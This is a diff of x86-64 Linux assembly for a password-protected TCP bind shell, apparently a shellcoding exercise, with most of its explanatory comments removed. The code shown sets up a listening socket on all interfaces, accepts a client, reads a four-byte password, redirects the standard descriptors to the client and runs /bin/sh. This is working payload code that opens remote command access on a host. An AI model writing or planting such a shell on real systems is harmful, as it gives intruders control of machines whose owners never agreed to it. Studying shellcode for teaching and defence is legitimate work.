@@ -1,5 +1,5 @@
 ; =================================================
-;   TCP Bind Shell
+;   TCP Bind Shell with Auth
 ; =================================================
 
 global _start
@@ -43,34 +43,27 @@ section .text
 
 _start:
 
-    xor r14, r14    ; zero out r14 for future repetitive use
+    xor r14, r14 ; zero out r14 for future use
 
     ; 1 - Create socket (socket syscall)
-    ;   > man 2 socket
-    ;   int socket(int domain, int type, int protocol);
-    ;   domain can be AF_INET (ipv4) or AF_INET6 (ipv6)
-    ;   type can be SOCK_STREAM (tcp) or SOCK_DGRAM (udp)
-    ;   returns the socket file descriptorq
-    ;   syscall number is 0x29
     push syscalls.socket
     pop rax
     push ipv4
 	pop rdi
     push tcp
 	pop rsi
-	cdq         ; edx = 0
+	cdq
 	syscall
 
     ; 2 - Save socket fd and build server struct
-    xchg rdi, rax    ; rdi = socket fd, rax = 0x02
+    xchg rdi, rax
 	
     sub rsp, 0x08
-	mov dword [rsp+0x04], r14d         ; server.sin_addr.s_addr = INADDR_ANY = 0x00
-    mov word  [rsp+rax], setup.port   ; server.sin_port = htons(PORT)
-	mov word  [rsp], ax             ; server.sin_family = AF_INET (2)
+	mov dword [rsp+0x04], r14d
+    mov word  [rsp+rax], setup.port
+	mov word  [rsp], ax
 
     ; 3 - Bind to socket
-    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
 	push syscalls.bind
     pop rax
 	mov rsi, rsp
@@ -79,7 +72,6 @@ _start:
 	syscall
 
     ; 4 - Listen
-	; listen(sock, MAX_CLIENTS)
 	push syscalls.listen
     pop rax
     push config.max_cons
@@ -87,7 +79,6 @@ _start:
 	syscall
 
     ; 5 - Accept incoming connection
-	; accept(sock, (struct sockaddr *)&client, &sockaddr_len)
 	push syscalls.accept
     pop rax
 	sub rsp, rdx
@@ -100,16 +91,16 @@ _start:
     ; 6 - Handle incoming connection
 	
     ; 6.1 - Save client fd and close parent fd
-    mov r9, rax             ; store the client socket fd into r9
+    mov r9, rax
 
     ; 6.2 - Read password from the client fd
     read_pass:
-        xor rax, rax    ; read syscall == 0x00
-        mov rdi, r9     ; from client fd
+        xor rax, rax
+        mov rdi, r9
         push 0x04
-        pop rdx         ; rdx = input size
+        pop rdx
         sub rsp, rdx
-        mov rsi, rsp    ; rsi => buffer
+        mov rsi, rsp
         syscall
 
     ; 6.3 - Check password
@@ -131,17 +122,14 @@ _start:
     jns loop_through_stdfds
 
     ; 9 - Execve
-    push r14 ; First NULL push    
-    mov rbx, binshString ; push /bin//sh in reverse
-    push rbx     ; store /bin//sh address in RDI
+    push r14
+    mov rbx, binshString
+    push rbx
     mov rdi, rsp 
-    
-    push r14 ; Second NULL push
+    push r14
     mov rdx, rsp
-    push rdi     ; set RSI to address of /bin//sh
+    push rdi
     mov rsi, rsp
-    
     push syscalls.execve
     pop rax
-    
     syscall
